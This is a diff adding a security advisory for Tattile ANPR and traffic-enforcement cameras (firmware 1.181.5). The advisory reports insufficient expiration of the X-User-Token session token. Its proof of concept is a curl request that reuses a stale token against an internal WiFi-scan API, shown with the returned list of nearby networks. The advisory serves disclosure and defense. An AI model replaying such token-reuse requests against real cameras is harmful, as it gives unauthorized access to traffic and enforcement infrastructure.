@@ -1,0 +1,157 @@
+
+Tattile Cameras 1.181.5 Insufficient Token (X-User-Token) Expiration
+
+Vendor: Tattile s.r.l.
+Product web page: https://www.tattile.com
+Affected version: Smart+ family: Smart+
+                                 Tolling+
+                                 Smart+ Speed
+                                 Smart+ Traffic Light
+                  Vega family: Axle Counter
+                               Vega 53
+                               Vega33 & Vega 11
+                  Basic family: Basic MK2
+                                ANPR Mobile
+                  Firmware: 1.181.5
+
+Summary: Tattile is an Italian manufacturer specializing in advanced
+ANPR/ALPR, traffic‑enforcement, and machine‑vision camera systems used
+across intelligent transportation networks, tolling infrastructures,
+access‑control environments, and industrial automation. Their portfolio
+includes high‑performance ITS cameras capable of vehicle identification,
+speed and red‑light enforcement, free‑flow tolling, and multi‑lane traffic
+monitoring, as well as compact ANPR units for parking and perimeter control,
+and industrial smart cameras for inspection and quality assurance. Across
+all model families, Tattile devices combine ruggedized hardware with onboard
+image processing, AI‑based vehicle analytics, and high‑sensitivity sensors
+designed for continuous operation in demanding outdoor conditions, making
+them critical components in modern traffic management and enforcement
+architectures.
+
+Desc: The application suffers an insufficient session expiration. This occurs
+when the web application permits an attacker to reuse old session credentials
+or tokens for authorization. Insufficient session expiration increases the
+device's exposure to attacks that can steal or reuse user's session identifiers.
+
+Tested on: lighttpd/1.4.64
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5976
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2026-5976.php
+CVE ID: CVE-2026-26342
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-26342
+
+
+22.01.2026
+
+--
+
+
+$ curl -k "https://cameraIP/api/__internal__/__hal__/wifi/network/scan" \
+> -H "X-User-Token: dfaf1d9c-3ef6-442e-70f2-0f86f965542b"
+[
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "QuantumOverflow",
+        "signal_quality": 60
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "PacketSorcery",
+        "signal_quality": 78
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "Jovanovic",
+        "signal_quality": 70
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "TP-31337",
+        "signal_quality": 50
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "entropyengine",
+        "signal_quality": 57
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "DarkMatterLAN",
+        "signal_quality": 71
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "hexadecimalHavoc",
+        "signal_quality": 54
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "neural-nexus",
+        "signal_quality": 60
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "ZSL_Guest",
+        "signal_quality": 57
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "WIFI_CORP",
+        "signal_quality": 68
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "WLAN_MDM",
+        "signal_quality": 67
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "ForbiddenFrequency",
+        "signal_quality": 67
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "sagemcomFC00",
+        "signal_quality": 54
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "vodafone1760",
+        "signal_quality": 57
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "It hurts when IP",
+        "signal_quality": 54
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "ZiggoF14256",
+        "signal_quality": 71
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "vodafoneAA60QK",
+        "signal_quality": 58
+    },
+    {
+        "encryption": "WPA2",
+        "essid": "Deco1",
+        "signal_quality": 55
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "zeroscience.mk",
+        "signal_quality": 58
+    },
+    {
+        "encryption": "WPA/WPA2",
+        "essid": "ddeshka",
+        "signal_quality": 67
+    }
+]
